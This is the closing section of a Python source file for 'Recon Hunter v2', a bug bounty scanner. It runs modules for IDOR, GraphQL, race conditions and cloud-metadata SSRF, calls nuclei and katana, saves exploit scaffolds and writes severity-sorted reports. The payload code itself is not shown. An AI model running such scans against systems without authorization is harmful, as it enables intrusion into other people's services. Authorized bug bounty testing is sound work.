    def run_module(self, name, func, *args, **kwargs):
        if name not in self.enabled:
            return
        try:
            print(f"\n{B}▶️  Running {name}...{X}")
            findings = func(*args, **kwargs)
            if findings:
                self.all_findings.extend(findings)
                print(f"  {R}🚨 {len(findings)} finding(s){X}")
            else:
                print(f"  {G}✅ No issues found{X}")
        except Exception as e:
            print(f"  {R}❌ {name} error: {e}{X}")
            self.logger.log(f"{name} error: {e}", "error")

    def run(self):
        print(f"""
{C}{B}╔══════════════════════════════════════════════════════════════╗
║  🔍  RECON HUNTER v2 — Advanced Bug Bounty Framework        ║
╠══════════════════════════════════════════════════════════════╣
║  🎯 Target: {self.url:<47}║
║  🌐 Host:   {self.host:<47}║
║  ⏰ Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<47}║
╚══════════════════════════════════════════════════════════════╝{X}
""")

        # Fetch target
        print(f"{B}🌐 Fetching target...{X}")
        try:
            resp = requests.get(self.url, headers={"User-Agent": UA},
                                timeout=15, verify=False, allow_redirects=True)
            print(f"  {G}✅ HTTP {resp.status_code} — {len(resp.content):,} bytes{X}")
            self.logger.log(f"Fetched {self.url} → {resp.status_code}", "success")
        except Exception as e:
            print(f"  {R}❌ {e}{X}")
            sys.exit(1)

        # Fingerprint
        self.fingerprint(resp)

        # JS analysis
        self.analyze_js(resp.text)

        # BOLA
        if "bola" in self.enabled:
            scanner = BOLAScanner(self.logger)
            self.run_module("bola", scanner.test, self.url)

        # GraphQL
        if "graphql" in self.enabled:
            tester = GraphQLTester(self.logger)
            self.run_module("graphql", tester.test, self.url)

        # Race condition
        if "race" in self.enabled:
            tester = RaceConditionTester(self.logger)
            self.run_module("race", tester.test, self.url)

        # Cloud metadata SSRF
        if "ssrf" in self.enabled:
            tester = CloudMetadataTester(self.logger)
            self.run_module("ssrf", tester.test, self.url)

        # External tools
        if "nuclei" in self.enabled:
            orch = ToolOrchestrator(self.logger)
            result = orch.run_nuclei(self.url)
            if result:
                self.tool_results["nuclei"] = result

        if "katana" in self.enabled:
            orch = ToolOrchestrator(self.logger)
            result = orch.run_katana(self.url)
            if result:
                self.tool_results["katana"] = result

        # Save exploit scaffolds
        exploit_gen = ExploitGenerator()
        scaffold_count = 0
        for f in self.all_findings:
            if f.exploit_scaffold:
                path = exploit_gen.save_scaffold(f)
                if path:
                    scaffold_count += 1

        if scaffold_count:
            print(f"\n{G}✅ {scaffold_count} exploit scaffold(s) saved to ./exploits/{X}")

        return self.all_findings, self.tool_results


# ============================================================
# REPORTING
# ============================================================

def print_report(findings):
    if not findings:
        print(f"\n{G}✅ No vulnerabilities found.{X}")
        return

    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda f: (order.get(f.severity, 99), f.vuln_type))

    counts = {}
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1

    print(f"\n{B}{'═' * 66}{X}")
    print(f"{B}  🎯 FINDINGS: {len(findings)}{X}")
    print(f"{B}{'═' * 66}{X}")

    for f in findings:
        color = {"CRITICAL": M, "HIGH": R, "MEDIUM": Y,
                 "LOW": B, "INFO": D}.get(f.severity, "")
        print(f"\n{color}[{f.severity}]{X} {B}{f.vuln_type}{X}")
        print(f"  URL:      {f.url}")
        if f.param:
            print(f"  Param:    {f.param}")
        if f.payload:
            print(f"  Payload:  {f.payload}")
        if f.evidence:
            print(f"  Evidence: {f.evidence}")
        if f.remediation:
            print(f"  Fix:      {f.remediation}")
        if f.cwe:
            print(f"  {f.cwe}")

    print(f"\n{B}Summary:{X} ", end="")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if counts.get(sev):
            color = {"CRITICAL": M, "HIGH": R, "MEDIUM": Y,
                     "LOW": B, "INFO": D}[sev]
            print(f"{color}{sev}={counts[sev]}{X} ", end="")
    print()


def save_report(findings, tool_results, output_prefix):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    json_path = f"{output_prefix}_{timestamp}.json"
    txt_path = f"{output_prefix}_{timestamp}.txt"

    report = {
        "generated_at": datetime.utcnow().isoformat(),
        "total_findings": len(findings),
        "findings": [asdict(f) for f in findings],
        "tool_results": tool_results,
    }
    with open(json_path, "w") as f:
        json.dump(report, f, indent=2, default=str)

    with open(txt_path, "w") as f:
        f.write(f"Recon Hunter v2 Report\n")
        f.write(f"Generated: {datetime.utcnow().isoformat()}\n")
        f.write(f"Total findings: {len(findings)}\n")
        f.write("=" * 72 + "\n\n")
        for finding in findings:
            f.write(f"\n[{finding.severity}] {finding.vuln_type}\n")
            f.write(f"  URL: {finding.url}\n")
            if finding.param:
                f.write(f"  Param: {finding.param}\n")
            if finding.payload:
                f.write(f"  Payload: {finding.payload}\n")
            f.write(f"  Evidence: {finding.evidence}\n")
            f.write(f"  Fix: {finding.remediation}\n")
            if finding.cwe:
                f.write(f"  CWE: {finding.cwe}\n")
            f.write("-" * 72 + "\n")

    print(f"\n{G}✅ JSON report: {json_path}{X}")
    print(f"{G}✅ Text report: {txt_path}{X}")
    return json_path, txt_path


# ============================================================
# MAIN
# ============================================================

ALL_MODULES = {"bola", "graphql", "race", "ssrf", "vuln-libs",
               "nuclei", "katana", "subfinder"}


def main():
    parser = argparse.ArgumentParser(
        description="🔍 Recon Hunter v2 — Advanced Bug Bounty Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 recon_hunter_v2.py -u https://target.com --full
  python3 recon_hunter_v2.py -u https://target.com --bola --graphql
  python3 recon_hunter_v2.py -u https://target.com --nuclei --katana
        """,
    )
    parser.add_argument("-u", "--url", required=True, help="🎯 Target URL")
    parser.add_argument("--full", action="store_true",
                        help="Run all modules including external tools")
    parser.add_argument("--bola", action="store_true", help="BOLA/IDOR scanner")
    parser.add_argument("--graphql", action="store_true", help="GraphQL introspection")
    parser.add_argument("--race", action="store_true", help="Race condition tester")
    parser.add_argument("--ssrf", action="store_true", help="Cloud metadata SSRF")
    parser.add_argument("--vuln-libs", action="store_true", help="Vulnerable JS libraries")
    parser.add_argument("--nuclei", action="store_true", help="Run nuclei templates")
    parser.add_argument("--katana", action="store_true", help="Run katana crawler")
    parser.add_argument("--subfinder", action="store_true", help="Run subfinder")
    parser.add_argument("-o", "--output", default="recon_v2", help="Output prefix")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout")

    args = parser.parse_args()

    # Build enabled modules
    if args.full:
        enabled = set(ALL_MODULES)
    else:
        enabled = set()
        for m in ALL_MODULES:
            if getattr(args, m.replace("-", "_"), False):
                enabled.add(m)

    # Always include core modules
    enabled.add("core")

    # Normalize URL
    url = args.url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    # Logger
    logger = ActivityLogger()

    # Run
    hunter = Hunter(url, logger, enabled)
    findings, tool_results = hunter.run()

    # Report
    print_report(findings)
    if findings or tool_results:
        save_report(findings, tool_results, args.output)

    # Roadmap
    print(f"""
{B}{'═' * 66}{X}
{B}📋 NEXT STEPS{X}
{B}{'═' * 66}{X}

{Y}1. Verify every finding manually before reporting.{X}
   • Reproduce each vulnerability with curl / browser
   • Take screenshots showing the impact

{Y}2. For BOLA/IDOR findings:{X}
   • Create two accounts, confirm cross-account access
   • Document the exact request/response pair

{Y}3. For SSRF → cloud metadata:{X}
   • Check if you can escalate to IAM credentials
   • DO NOT use discovered credentials — report immediately

{Y}4. For GraphQL findings:{X}
   • Explore sensitive mutations manually
   • Test field-level authorization

{Y}5. For race conditions:{X}
   • Retry 50-100 times to confirm reproducibility
   • Focus on payments, vouchers, rate limits

{B}{'═' * 66}{X}
{G}💡 Logs saved to: ./activity_logs/{X}
{G}💡 Exploits saved to: ./exploits/{X}
""")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}⚠️  Interrupted.{X}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{R}❌ Fatal: {type(e).__name__}: {e}{X}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
